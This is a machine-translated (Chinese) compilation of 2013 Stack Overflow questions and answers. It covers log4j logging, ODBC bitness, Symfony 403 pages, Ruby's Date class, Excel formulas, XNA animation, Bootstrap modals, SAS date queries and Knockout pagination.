以上可能会起作用，但我不太热衷于使用系统属性。有没有办法使用多个记录器来实现同样的事情？

我知道我可以设置多个记录器并在应用程序中调用相关记录器，但我遇到的问题是我无法知道哪些应用程序当前正在某些类上运行。例如..

设置多个记录器

```
log4j.rootLogger=WARN, stdout,MyApp1, MyApp2, MyApp3, MyApp4 
# setup MyApp1
log4j.appender.myAppLogger=org.apache.log4j.RollingFileAppender
log4j.appender.myAppLogger.File=/myapp/logs/myapp1.log
...
...
# setup MyApp4
log4j.appender.LoudAppender=org.apache.log4j.RollingFileAppender
log4j.appender.myAppLogger.File=/myapp/logs/myapp4.log
...

log4j.logger.com.yourpackage.yourclazz=TRACE 
```

所有 4 个应用程序都使用 MyAppService 和 MyAppDAO 类。如果我想在 MyAppService 或 MyAppDAO 中写入日志文件，我将不得不执行以下操作：

```
- import all 4 loggers in MyAppservice
- if the application is myapp1 use myapp1 logger
- if the application is myapp2 use myapp2 logger
- if the application is myapp3 use myapp3 logger
- if the application is myapp4 use myapp4 logger 
```

以上也可能有效，但在代码中的多个位置有多个 if 语句不是很干净。

我正在寻找一种更简洁、更通用的方法，不需要使用 IF 语句或在方法等中传递应用程序的名称。有更好的建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:41:34.123

您希望每个类都登录到同一个文件，但文件的名称应取决于入口点。在每个主要课程中，您可以：

*   以编程方式设置附加程序并将其添加到根记录器。
*   或加载不同的属性文件
*   或设置包含文件名的系统属性（而不是在命令行上设置）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T14:14:31.420

我喜欢使用多个记录器的想法。正如我所见，您在 MyAppService 和 MyAppDAO 类等常见类中使用记录器时遇到问题。我会说在实例化这些对象时，将记录器对象传递给构造函数。如果您使用静态记录器对象，那么您可能希望将作为参数传递给您在这些对象上调用的方法。这样您就不需要对记录器进行 if-else 条件检查。

# windows - 从 Windows 7 中的 .net 应用程序调用时如何识别 32 位 odbc

> ID：15973293
> 
> 赞同：0
> 
> 时间：2013-04-12T13:58:51.490
> 
> 标签：windows, odbc, system, bit, dsn

我在 vb.net 中有一个桌面应用程序，它在 Windows XP 中运行良好，但在 Windows 7 64 位上安装该应用程序后，它无法运行。32 位 ODBC 确实显示了 DB2 连接的驱动程序（版本 9.7），但 64 位 ODBC 版本没有显示它。我在 Windows XP 中使用系统 DSN 连接到 DB2，并在 Windows 7 中也尝试过。

因此，我必须在代码本身中明确提供信息才能调用它的 32 buit 版本。需要帮忙。请让我知道应用程序中是否需要进行一些更改而不是调用。

阿舒！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:01:23.420

您不能在同一进程中混合使用 32 位代码和 64 位代码。

如果要使用 32 位 ODBC，则必须将进程标记为仅 x86。

# symfony - 在 Symfony 2.1 403 禁止页面中显示所需角色

> ID：15973295
> 
> 赞同：2
> 
> 时间：2013-04-12T13:58:53.097
> 
> 标签：symfony, symfony-2.1

我有一个 Symfony 2.1 应用程序，它具有各种访问控制区域。我的设置包括一个供用户管理其帐户的管理区域，另一个供公司管理员用户管理其公司帐户的区域以及我们和办公室工作人员的后端。

所有这些不同的用户都定义了角色，ROLE_ADMIN、ROLE_COMPANY_ADMIN 等。在我的 security.yml 中设置的防火墙可以很好地处理这些不同的情况，但是当用户访问没有所需角色的页面时，会得到一个通用的 403 禁止页面。

我希望有一个自定义页面，该页面具有不同的内容，具体取决于用户缺少的所需角色。即，您无法访问此页面，因为您不是管理员|公司管理员。

我需要检索导致异常的路由的所需角色，然后我可以将其与用户进行比较。有没有好的方法来做到这一点？

非常感谢，艾尔

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:07:34.407

您可以添加自定义访问拒绝 url 并实现自己的控制器。

一个很好的例子贴在这里： http: [//michelsalib.com/2011/03/31/advance-customization-of-the-403-error-page-in-symfony2/](http://michelsalib.com/2011/03/31/advance-customization-of-the-403-error-page-in-symfony2/)

# ruby-on-rails - 由于应用程序错误，EasyEclipse for Ruby and Rails 无法启动

> ID：15973297
> 
> 赞同：2
> 
> 时间：2013-04-12T13:58:55.910
> 
> 标签：ruby-on-rails, eclipse, installation

我刚刚[为 Ruby 和 Rails 安装了 EasyEclipse](http://www.easyeclipse.org/site/distributions/ruby-rails.html)。尝试启动它时，我收到以下错误消息：

> 发生了错误。查看日志文件[日志文件的路径]

[日志文件](http://txtup.co/v7Jgm)内容大致如下：

```
!MESSAGE Application error
!STACK 1
java.lang.UnsatisfiedLinkError: no swt-win32-3236 in java.library.path
    at java.lang.ClassLoader.loadLibrary(Unknown Source)
    [22 more lines of the form "at java.lang..." or "at org.eclipse..."]

!MESSAGE One or more bundles are not resolved 
because the following root constraints are not resolved:
[about lines specifying missing bundles such as "com.aptana.ide.parsing_0.0.0"] 
```

我如何解决它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-09-25T15:24:38.740

在 Windows 中，将 eclipse.exe 设置为“以管理员身份运行”。

1.  浏览到 EasyEclipse 安装目录（默认：C:\Program Files (x86)\EasyEclipse for Ruby and Rails xxxx）
2.  右键单击 eclipse.exe 并转到属性
3.  在兼容性选项卡上，启用“以管理员身份运行此程序”，然后单击确定

# ruby - 日期::今天未定义？

> ID：15973299
> 
> 赞同：12
> 
> 时间：2013-04-12T13:59:06.067
> 
> 标签：ruby, class, date

为什么只加载了 Date 类的某些方法而没有显式加载：

```
require 'date' 
```

线？

例如：

```
irb(main):002:0> Date.today
NoMethodError: undefined method `today' for Date:Class
from (irb):2
from /Users/mwlang/.rvm/rubies/ruby-2.0.0-p0/bin/irb:16:in `<main>' 
```

接着...

```
irb(main):003:0> require 'date'
=> true 
```

导致...

```
irb(main):004:0> Date.today
=> #<Date: 2013-04-12 ((2456395j,0s,0n),+0s,2299161j)> 
```

[http://ruby-doc.org/stdlib-2.0/libdoc/date/rdoc/Date.html](http://ruby-doc.org/stdlib-2.0/libdoc/date/rdoc/Date.html)上的文档似乎没有为这种行为提供明确的解释。对#irc 的评论说它是一个标准库而不是核心库，但核心甚至没有定义 Date 类并使用 -f 启动 irc （抑制读取 .irbrc）以获得最小负载似乎仍然加载某种基础/核心日期类。

想要对正在发生的事情进行技术解释以及对解释这一点的 Ruby 文档的引用，以便在我从 Ruby 1.8.7 切换到 Ruby 2.0.0 时了解其他此类遭遇。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-12T14:58:14.630

出于兼容性原因`Date`，您看到的类在[lib/rubygems/specification.rb中定义：](https://github.com/rubygems/rubygems/blob/v2.3.0/lib/rubygems/specification.rb#L20)

```
# date.rb can't be loaded for `make install` due to miniruby
# Date is needed for old gems that stored #date as Date instead of Time.
class Date; end 
```

它是一个空类定义，不提供任何方法或功能。

如果在没有 RubyGems 的情况下启动 IRB，那么 Date 类就消失了：

```
$ ruby --disable-gems -S irb
irb(main):001:0> Date
NameError: uninitialized constant Date 
```

### 更新

[RubyGems 2.4.0](https://github.com/rubygems/rubygems/blob/v2.4.0/History.txt#L45)`Date`中删除了空类：

> *   RubyGems 不再定义空的 Date 类。Benoit Daloze 的拉取请求[#948](https://github.com/rubygems/rubygems/pull/948)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-01-08T14:14:24.787

补充@Stefan 回答：

请注意，这已在 ruby​​gems 的更高版本中被删除。

*   更改日志[在这里](https://github.com/rubygems/rubygems/blob/be819945ba1c788a5b589a9d5daa86e9dcaaba3f/History.txt#L148-L149)
*   合并请求[在这里](https://github.com/rubygems/rubygems/pull/948)

# excel-formula - Excel函数对选定单元格中的值求和

> ID：15973303
> 
> 赞同：0
> 
> 时间：2013-04-12T13:59:16.577
> 
> 标签：excel-formula

我正在寻找一个函数，它将获取总周值，计算右侧等于总周值的单元格数量，并提供这些单元格的总和。

例如，单元格 A2 的值为 3。我想要一个函数来计算右侧的 3 个单元格（B2、C2、D2）并将这 3 个单元格的值相加到单元格 E2 中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:12:12.007

在单元格 E2 中，使用公式`=SUM(OFFSET($B$2,0,0,1,A2))`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:29:03.733

试试这个解决方案。它会查看`Selection`并循环遍历它的值。对于每个值，它将遍历范围中的下一个单元格并消息该行的总和。最后，它会发送所有单元格的总和。

要自定义，请更新弹出消息的代码。

> 用于`Option Explicit`防止由于未声明的变量而导致的运行时错误。

```
Option Explicit
Sub SumOfWeeks()
    Dim cell As Object
    Dim count As Integer
    Dim addr As String
    Dim rowSum As Integer
    Dim i As Integer
    Dim totalSum As Integer

    For Each cell In Selection
        count = cell.Value
        rowSum = 0
        If IsNumeric(count) Then
            For i = 1 To count
               rowSum = rowSum + cell.Offset(0, i).Value
            Next i
            totalSum = totalSum + rowSum
            MsgBox "Sum of Row is: " & rowSum
        End If
    Next cell
    MsgBox "Total Sum is: " & totalSum
End Sub 
```

另一种选择可能是创建一个范围字符串并找到`SUM`范围中的一个。将此代码视为起点，而不是复制粘贴解决方案。

# c# - XNA/C# 2D 播放器动画问题

> ID：15973306
> 
> 赞同：0
> 
> 时间：2013-04-12T13:59:28.323
> 
> 标签：c#, animation, 2d, xna-4.0

我和我的朋友决定为自己制作一款游戏。它采用口袋妖怪和旧的 Harvest Moon 图形风格。我一直在用动画做一些测试，我让它工作了。我的播放器 Sprite Sheet 有八个图像（每个方向 2 个）。

但是，当我按住向上箭头键和向左或向右或向下箭头键和向左或向右时，它试图同时执行两个动画。我知道必须有办法解决这个问题，我只需要有人告诉我怎么做。

这是我为我的播放器设置的动画类：

```
public class Animation
{
    Texture2D texture;
    Rectangle rectangle;
    public Vector2 position;
    Vector2 origin;
    Vector2 velocity;

    int currentFrame;
    int frameHeight;
    int frameWidth;

    float timer;
    float interval = 75;

    public Animation(Texture2D newTexture, Vector2 newPosition, int newFrameHeight, int newFrameWidth)
    {
        texture = newTexture;
        position = newPosition;
        frameWidth = newFrameWidth;
        frameHeight = newFrameHeight;
    }

    public void Update(GameTime gameTime)
    {
        rectangle = new Rectangle(currentFrame * frameWidth, 0, frameWidth, frameHeight);
        origin = new Vector2(rectangle.Width / 2, rectangle.Height / 2);
        position = position + velocity;

        // Comment Out For Camera!!!!
        if (position.X <= 0 + 10) position.X = 0 + 10;
        if (position.X >= 1920 - rectangle.Width + 5) position.X = 1920 - rectangle.Width + 5;
        if (position.Y <= 0 + 10) position.Y = 0 + 10;
        if (position.Y >= 1080 - rectangle.Height + 7) position.Y = 1080 - rectangle.Height + 7;

        if (Keyboard.GetState().IsKeyDown(Keys.Right))
        {
            AnimateRight(gameTime);
            velocity.X = 2;
        }
        else if (Keyboard.GetState().IsKeyDown(Keys.Left))
        {
            AnimateLeft(gameTime);
            velocity.X = -2;
        }
        else velocity = Vector2.Zero;

        if (Keyboard.GetState().IsKeyDown(Keys.Up))
        {
            AnimateUp(gameTime);
            velocity.Y = -2;
        }
        if (Keyboard.GetState().IsKeyDown(Keys.Down))
        {
            AnimateDown(gameTime);
            velocity.Y = 2;
        }
    }

    public void AnimateRight(GameTime gameTime)
    {
            timer += (float)gameTime.ElapsedGameTime.TotalMilliseconds / 2;
            if (timer > interval)
            {
                currentFrame++;
                timer = 0;
                if (currentFrame > 1)
                    currentFrame = 0;
            }
    }

    public void AnimateLeft(GameTime gameTime)
    {
            timer += (float)gameTime.ElapsedGameTime.TotalMilliseconds / 2;
            if (timer > interval)
            {
                currentFrame++;
                timer = 0;
                if (currentFrame > 3 || currentFrame < 2)
                    currentFrame = 2;
            }
    }

    public void AnimateUp(GameTime gameTime)
    {
            timer += (float)gameTime.ElapsedGameTime.TotalMilliseconds / 2;
            if (timer > interval)
            {
                currentFrame++;
                timer = 0;
                if (currentFrame > 5 || currentFrame < 4)
                    currentFrame = 4;
            }
    }

    public void AnimateDown(GameTime gameTime)
    {
            timer += (float)gameTime.ElapsedGameTime.TotalMilliseconds / 2;
            if (timer > interval)
            {
                currentFrame++;
                timer = 0;
                if (currentFrame > 7 || currentFrame < 6)
                    currentFrame = 6;
            }
    }

    public void Draw(SpriteBatch spriteBatch)
    {
        spriteBatch.Draw(texture, position, rectangle, Color.White, 0f, origin, 1.0f, SpriteEffects.None, 0);
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T15:16:37.620

这将允许一次仅向一个方向移动（我相信如果您遵循口袋妖怪的游戏风格，这就是您想要的）：

```
 if (Keyboard.GetState().IsKeyDown(Keys.Right))
    {
        AnimateRight(gameTime);
        velocity.X = 2;
    }
    else if (Keyboard.GetState().IsKeyDown(Keys.Left))
    {
        AnimateLeft(gameTime);
        velocity.X = -2;
    }       
    else if (Keyboard.GetState().IsKeyDown(Keys.Up))
    {
        AnimateUp(gameTime);
        velocity.Y = -2;
    }
    else if (Keyboard.GetState().IsKeyDown(Keys.Down))
    {
        AnimateDown(gameTime);
        velocity.Y = 2;
    }
    else velocity = Vector2.Zero; 
```

如果您想一次移动两个方向，例如：

```
 bool animated = false;
    if (Keyboard.GetState().IsKeyDown(Keys.Right))
    {
        AnimateRight(gameTime);
        velocity.X = 2;
        animated = true;
    }
    else if (Keyboard.GetState().IsKeyDown(Keys.Left))
    {
        AnimateLeft(gameTime);
        velocity.X = -2;
        animated = true;
    }    
    else
    {
         velocity.X = 0;
    }  

    if (Keyboard.GetState().IsKeyDown(Keys.Up))
    {
        if(animated == false)
        {   AnimateUp(gameTime); }

        velocity.Y = -2;
    }
    else if (Keyboard.GetState().IsKeyDown(Keys.Down))
    {
        if(animated == false)
        { AnimateDown(gameTime); }
        velocity.Y = 2;
    }
    else velocity.Y = 0; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-25T19:02:10.937

我知道这有点老了，但是在这种情况下，如果同时按下两个键，玩家无法控制的顺序优先级会影响他将移动的方向。更好的解决方案是：

```
velocity = Vector2.Zero;

if (Keyboard.GetState().IsKeyDown(Keys.Right))
    velocity.X += 2;
if (Keyboard.GetState().IsKeyDown(Keys.Left))
    velocity.X -= 2;

if (Keyboard.GetState().IsKeyDown(Keys.Up))
    velocity.Y -= 2;
if (Keyboard.GetState().IsKeyDown(Keys.Down))
    velocity.Y += 2;

if (velocity.X > 0)
    AnimateRight(gameTime);
else if (velocity.X < 0)
    AnimateLeft(gameTime);

// Animate Up/Down only if Left/Right does not... 
// not sure if needed but will follow the style.
if (velocity.X == 0) 
{
    if (velocity.Y > 0)
        AnimateDown(gameTime);
    else if (velocity.Y < 0)
        AnimateUp(gameTime);
} 
```

这样，我们将输入和逻辑分开，这使事情变得更加清晰，并且我们不会优先考虑某些输入（xept for up/down ...但是w/e）如果玩家尝试向左和向右同时，运动将被取消。

# c# - ASP.NET 按钮单击事件未在引导模式中触发

> ID：15973317
> 
> 赞同：5
> 
> 时间：2013-04-12T13:59:56.040
> 
> 标签：c#, asp.net, twitter-bootstrap, modal-dialog

我在我的网站上使用 Bootstrap。在单击注册按钮时会弹出注册模式。它有一些字段和一个注册按钮和一个关闭按钮。他们的代码是

```
<div id="myModalRegister" runat="server" class="modal hide fade" tabindex="-1"
 role="dialog" aria-labelledby="myModalLabel"
    aria-hidden="true">
    <div class="modal-header">
     <button type="button" class="close" data-dismiss="modal" aria-hidden="true">
            ×</button>
        <h3 id="H1">
            Register</h3>
    </div>
    <div class="modal-body">

    <i class="icon-user"></i>Email ID</label>
        <input type="text" class="span3" id="txtRegEmail" runat="server" />
        <br />
    </div>

    <div class="modal-footer">
        <button class="btn btn-danger" data-dismiss="modal" aria-hidden="true">
            Close</button>
        <asp:Button ID="btRegister" runat="server" CssClass="btn btn-primary" 
            Text="Register" onclick="btRegister_Click" />
    </div>
</div> 
```

注册按钮是

```
<li class="one"><a href="#myModalRegister" role="button" data-toggle="modal" >
       <i class="icon-user icon-white"></i> Sign Up</a></li> 
```

当我单击 btRegister 按钮时，未触发 Click 事件。你能帮助我吗？？

经过一番研究，我发现模态窗口是在`Form`标签之外呈现的。这就是事件没有触发的原因。我该如何解决这个问题？？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-21T14:10:09.807

我认为你有两个选择：

1.  将按钮放在标签内（您不需要将模态框放在表单标签之外）
2.  使用启用 javascript 的按钮而不是服务器端控件

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-03-01T00:09:40.593

我今天遇到了同样的问题，发现我的按钮 ID 与表单中的另一个按钮相同，请尝试检查您没有具有相同 ID 的另一个按钮，然后它将像 BOSS 一样工作！

# php - 使用 codebird.php 显示 twitter 列表状态

> ID：15973321
> 
> 赞同：0
> 
> 时间：2013-04-12T14:00:00.360
> 
> 标签：php, javascript, twitter

因此，我完成了本教程并设置了一个 twitter 小部件，它使用 codebird.php 和 javascript 来显示 twitter 用户状态或搜索词的列表：

[检索 Twitter 时间线和主题标签的最简单方法 (Twitter OAuth API 1.1)](http://www.queness.com/post/14004/easiest-way-to-retrieve-twitter-timeline-and-hashtags-twitter-oauth-api-11)

我现在要做的是编辑它，以便它显示 Twitter 列表的状态，例如：

[https://twitter.com/13news/norfolk](https://twitter.com/13news/norfolk)

我想我需要将下面的“搜索”选项切换为“列表”

```
 search: '%23heroes2013', //leave this blank if you want to show user's tweet
user: 'quenesstestacc', //username 
```

并且还编辑这部分代码以获取列表而不是搜索词，但我不确定如何。

```
 // different JSON request {hash|user}
    if (JQTWEET.search) {
      request = {
          q: JQTWEET.search,
          count: JQTWEET.numTweets,
          api: 'search_tweets'
      }
    } else {
      request = {
          q: JQTWEET.user,
          count: JQTWEET.numTweets,
          api: 'statuses_userTimeline'
      }
    } 
```

Codebird 的自述文件解释了将 Twitter API 方法映射到 Codebird 的函数调用，如下所示：

> 对于 Twitter API 方法中的每个斜线，在 Codebird 函数中使用下划线。
> 
> 示例：状态/更新映射到 Codebird::statuses_update()。
> 
> 对于 Twitter API 方法中的每个下划线，请在 Codebird 函数中使用 camelCase。
> 
> 示例：statuses/home_timeline 映射到 Codebird::statuses_homeTimeline()。
> 
> 对于方法中的每个参数模板，请在 Codebird 函数中使用 UPPERCASE。也不要忘记在参数列表中包含参数。
> 
> 例子：
> 
> statuses/show/:id 映射到 Codebird::statuses_show_ID('id=12345')。users/profile_image/:screen_name 映射到 >Codebird::users_profileImage_SCREEN_NAME('screen_name=mynetx')。<

但是，我找不到如何映射这样的东西：

> 列表/statuses.json?slug=teams&owner_screen_name=MLS&count=1

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:15:57.927

对于您提到的 API 调用，映射应该像这样简单：

```
<?php
$cb->lists_statuses('slug=teams&owner_screen_name=MLS&count=1');
?> 
```

它有效吗？

# visual-studio-2010 - Visual Studio 数据库项目能否为每个已更改的对象创建单独的差异脚本？

> ID：15973326
> 
> 赞同：0
> 
> 时间：2013-04-12T14:00:12.620
> 
> 标签：visual-studio-2010, database-project

我开始在 Visual Studio 2010 中使用数据库项目，我知道它将生成一个脚本来部署所有更改（例如，将表添加到列、新的 ALTER PROC 语句等）。

可以配置数据库项目以便我为每个对象获取单独的文件吗？例如，如果添加了三个表和列，我是否可以为每个包含特定表的 ALTER TABLE ADD COLUMN 语句的表获取一个 SQL 文件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-10T16:57:36.857

我很确定这个答案将是“不”。DB 和 SQL 项目的真正设计目的是查看项目的状态，将其与数据库的状态进行比较，并一次性使它们相同。我不确定在这种情况下您要完成什么。您能否提供更多详细信息，说明您为什么需要或想要为每个已更改的对象生成单独的 ALTER 脚本？

# php - 如何在 php 测验中保留先前标记的选项

> ID：15973330
> 
> 赞同：0
> 
> 时间：2013-04-12T14:00:27.503
> 
> 标签：php

我正在制作一个应该进行测验的 PHP 项目。对于每个“下一个”，我都从数据库中检索一个问题，当我使用我的“上一个”按钮功能时，我会丢失我标记的选项（我正在使用单选按钮来标记正确的选项）以及每个上一个和下一个按钮 我正在从数据库中检索数据，即在开始测验之前我没有所有问题，我正在访问数据库以获取每个下一个和上一个功能。任何建议如何做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:02:06.970

您应该考虑将答案存储在 $_SESSION 变量中，以便它们随时可用

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T15:07:35.253

在每个测验步骤的顶部，您应该有`session_start();`，然后当您提交表单/测验步骤以进入新页面时，您应该执行以下操作：

```
$_SESSION['step1']['nameOfRadioFormElemnt'] = $_POST['nameOfRadioFormElemnt']; 
```

然后，每当您想取回发布的值时，您只需访问`$_SESSION['step1']'nameOfRadioFormElemnt']`

希望这可以帮助。有关更多信息，请查看`http://www.tizag.com/phpT/phpsessions.php`

# sql - 使用最近日期的 SAS 方法

> ID：15973336
> 
> 赞同：0
> 
> 时间：2013-04-12T14:01:10.013
> 
> 标签：sql, sas

我正在寻找一种在 SAS 中使用最近日期的方法。我在网上看过很多例子，但由于它们的复杂性和我对 SAS 的缺乏经验，我无法根据我的需要适当地调整它们。为了保持一致性，该解决方案最好使用 SQL（通过 proc sql），但如果在 SAS 代码中更容易完成相同的任务，那么这也是可以接受的。

我正在查询的表（表 B）的数据类似于：

```
 ID        Contract   Plan Code     From       Thru 
  8516515      S5000        000      1/1/2013   2/28/2013 
  8516515      S6100        010      1/1/2012  12/31/2012
  8516515      H3565        025      1/1/2011  12/31/2011 
```

我在内部加入上述数据的表（表 A）与此类似：

```
 ID           PA
  8516515    ITPNB010412 
```

我用来查询表 B 的日期是在一个名为的宏变量中分配的`date_of_report`，在上面的示例（表 B）`date_of_report`中是`"11Apr2013"d`.

我希望在表 B 中制作代码拉线 #1 而不是其他。在任何情况下，我们都不应该对特定的时间范围进行四舍五入……只选择最近符合条件的行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T17:02:07.003

这在 SAS 中很容易解决。有两种相当简单的解决方案，具体取决于您是否需要为表 A 中的单个记录或可能为多个记录（例如多个 ID）解决此问题。

```
data tableB;
informat from Thru MMDDYY10.;
input ID        Contract   $ Plan_Code     From       Thru;
datalines;
8516515      S5000        000      1/1/2013   2/28/2013 
8516515      S6100        010      1/1/2012  12/31/2012
8516515      H3565        025      1/1/2011  12/31/2011
;;;;
run;

data tableA;
input  ID           PA $;
datalines;
8516515    ITPNB010412
;;;;
run; 
```

鉴于这些 tableA 和 tableB，这里是解决方案 1 - 当 tableA 只有一个 ID 时有效。

```
proc sort data=tableB;
by ID thru;
run;

%let dateofreport='12APR2013'd;
data tableC;
set tableB;
by ID thru;
retain a_set;
if first.ID then a_set=0;
if from le &dateofreport. le thru then do;
  set tableA;
  a_set=1;
end;
else call missing(PA);
if not(a_set) and (last.id) then 
  set tableA;
run; 
```

如果您有多个 ID，则情况会有所不同。（这适用于单个 ID 或多个 ID 的情况）。

```
data tableC;
merge tableB tableA;
by id;
drop PA PA_set;
length PA_n $10;
retain PA_set;
if first.id then PA_set=0;
if (from le &dateofreport. le thru) or (last.id and PA_set=0) then do;
    PA_n=PA;
    PA_set=1;
end;
rename PA_n=PA;
run; 
```

我确信这可以在 PROC SQL 中完成，但我认为这需要多次传递数据。我可以想象最简单的方法是创建两个数据集，一个只有 max(thru)，一个带有来自 le &dateofreport le thru 的记录，然后将它们合并在一起，然后保留该集合中的记录与最低日期值（即，唯一的记录，或者如果两者都保留不是 max(thru) 的记录）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T20:33:53.017

一个完美（且经过测试）的 SQL 方法是执行以下操作（取自[此处](http://www.listserv.uga.edu/cgi-bin/wa?A2=ind1206b&L=sas-l&P=22690)）：

```
data a;
  dt='02JUN2012'd;
run;

data b;
  dt='01JUN2012'd;
  output;
  dt='03JUN2012'd;
  output;
run;

proc sql;
    select
      a.dt as dt_a,
      b.dt as dt_b,
      count(*),
      abs(a.dt-b.dt) as diff
    from a,b
    group by a.dt
    having calculated diff=min(calculated diff)
  ;
quit; 
```

# javascript - 遍历用户列表并在淘汰赛中推送到数组

> ID：15973337
> 
> 赞同：0
> 
> 时间：2013-04-12T14:01:11.170
> 
> 标签：javascript, knockout.js, knockout-2.0

我有这个脚本，它返回所有用户的列表。我想拥有：

*   根据返回的数据设置 viewModel 的 totalUsers 和 page 属性。
*   遍历用户列表并将最后一个用户对象推送到 observableArry
*   push() 方法将用户添加到已加载和显示的用户

**目的** 我实际上想统计所有用户，因为我将在一个页面加载 20 个用户，当我到达页面底部时，我会检查是否还有更多用户要加载，然后再加载它们。这样，如果我有 400 个用户 - 他们不会一次全部加载并占用时间。

**淘汰赛JS文件**

```
$.views.Roster.RosterViewModel = function (data) {
    var self = this;
    self.RosterUsers = ko.observableArray([]);
    _rosterUsers = self.RosterUsers;
    self.currentPage = ko.observable(1);
    self.toDisplay = ko.observable(20);
    self.filteredRoster = ko.computed(function(){
        var init = (self.currentPage()-1)* self.toDisplay(),
            filteredList = [],
            rosterLength = self.RosterUsers().length,
            displayLimit = self.toDisplay();
        if(rosterLength == 0)
            return[];
        for(var i = init; i<(displayLimit + init) - 1 && i<rosterLength; i++)
        {
            filteredList.push(self.RosterUsers()[i]);
        }
        return filteredList;
    }),
    totalRoster = ko.computed(function () {
        return self.RosterUsers().length;
    }),
    changePage = function (data) {
        currentPage(data);
    },
    next = function () {
        if ((self.currentPage() * self.toDisplay()) > self.RosterUsers().length)
            return;

        self.currentPage(self.currentPage() + 1);
    },
    prev = function () {
        if (self.currentPage() === 1)
            return;

        self.currentPage(self.currentPage() - 1);
    },

    $.views.Roster.RosterViewModel.AddUsers(data);
}; 
```

**HTML 视图页面**

```
<script  type="text/html" id ="grid">

    <section id="rosterImages" style=" float:left">
    <section id="users">
        <div id="nameImage">
            <figure id="content">
                <img width="158" height="158" alt="Gravatar" data-bind="attr:{src: GravatarUrl}"/>
                <figcaption>
                    <a title="Email" id="emailIcon" class="icon-envelope icon-white" data-bind="attr:{'href':'mailto:' + Email()}"></a>
                    <a title="Profile" id="profileIcon" class="icon-user icon-white"></a>
                </figcaption>
            </figure>
            <p data-bind="text:Name"></p>
            </div>
        </section>
    </section>
</script>

<ul>
        <li><a href="#" data-bind="click: prev">Prev</a></li>
          <!-- ko foreach: ko.utils.range(1, totalRoster()/toDisplay() + 1) -->
          <li><a href="#" data-bind="text: $data, click: $parent.changePage"></a></li>
          <!-- /ko -->
        <li><a href="#" data-bind="click: next">Next</a></li>
      </ul> 
```

**更新：滚动脚本**

```
$(window).scroll(function () {
        if ($(window).scrollTop() == $(document).height() - $(window).height()) {
            if (parseInt($.views.Roster.RosterViewModel.currentPage(), "10") * 20 < parseInt($.views.Roster.RosterViewModel.totalRoster(), "10")) {
                $.views.Roster.RosterViewModel.next();
            }
        }
    }); 
```

我怎样才能用我已经拥有的东西来添加这些东西？提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T15:30:55.267

干得好。我模仿了小提琴的 getRoster ajax 调用。在您的情况下，您将进行“GET”调用而不是“POST”。

[http://jsfiddle.net/sujesharukil/z8vpx/4/](http://jsfiddle.net/sujesharukil/z8vpx/4/)

rosterArray 是主要的 observableArray，它将存储来自服务器的整个列表，filteredRoster 将根据 currentPage 从 rosterArray 获取数据，toDisplay 存储限制，currentPage 跟踪当前页面，计算 totalRoster 返回数组中的总元素

```
var rosterArray = ko.observableArray(),
    currentPage = ko.observable(1),
    toDisplay = ko.observable(20),
    filteredRoster = ko.computed(function(){
        var init = (currentPage() - 1) * toDisplay(),
            filteredList = [],
            rosterLength = rosterArray().length,
            displayLimit = toDisplay();

        if(rosterLength === 0)
            return [];

        for(var i = init; i < (displayLimit + init) - 1 && i < rosterLength; i++){
            filteredList.push(rosterArray()[i]);
        }

        return filteredList;
    }),
    totalRoster = ko.computed(function(){
        return rosterArray().length;
    }),
    changePage = function(data){
        currentPage(data);
    },
    next = function(){
        if((currentPage() * toDisplay()) > rosterArray().length)
            return;

        currentPage(currentPage() + 1);
    },
    prev = function(){
        if(currentPage() === 1)
            return;

        currentPage(currentPage() - 1);
    }; 
```

希望有帮助。

-苏杰

# jquery - JQuery 动态 img 加载和设置宽度在 IE 中不起作用

> ID：15973340
> 
> 赞同：0
> 
> 时间：2013-04-12T14:01:21.283
> 
> 标签：jquery, image, internet-explorer

我正在编写一个基于动态图像的函数，该动态图像是根据客户徽标拉入的。此徽标自动填充到 logoContainer div 中。我正在动态设置宽度，因此我可以让徽标正确居中，margin: 0 auto 无论拉入什么徽标，因为在我们获得新客户时为每个徽标指定需要太长时间。

此功能专门在 chrome 和 firefox 中有效，但在任何版本的 IE 中均无效。该函数停止加载 .load，但不提供任何错误。

```
$(document).ready(function() {
    $("#logoIMG").load(function() {
        $("#logoContainer").css("width",$(this).width());
    });
}); 
```

# javascript - 使用 document.getElementById 时如何删除和替换 div 中的内容

> ID：15973346
> 
> 赞同：0
> 
> 时间：2013-04-12T14:01:33.493
> 
> 标签：javascript, html

我正在使用这个 javascript 将数组中的文本放入`div`

```
function showTopic(j)   
{   
        document.getElementById("topicBox").innerHTML += 

        '<h2>'+ arrSubTopics[j].subCategoryName   +'</h2>

         '+ arrSubTopics[j].subCategoryInformation +' ';          
 } 
```

这只会添加到 中`div`，但**我希望它替换当前在`div`**

请进行建设性的批评，而不是投反对票。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:02:28.160

使用`=`代替`+=`：

```
document.getElementById("topicBox").innerHTML = '<h2>' // the rest... 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T14:02:38.147

替换`+=`为`=`：

```
document.getElementById("topicBox").innerHTML = ... 
```

`+=`表现为字符串连接，而您在这里不需要它。

# angularjs - ng-view / 其他 iscroll 实现之外的页脚

> ID：15973348
> 
> 赞同：2
> 
> 时间：2013-04-12T14:01:35.450
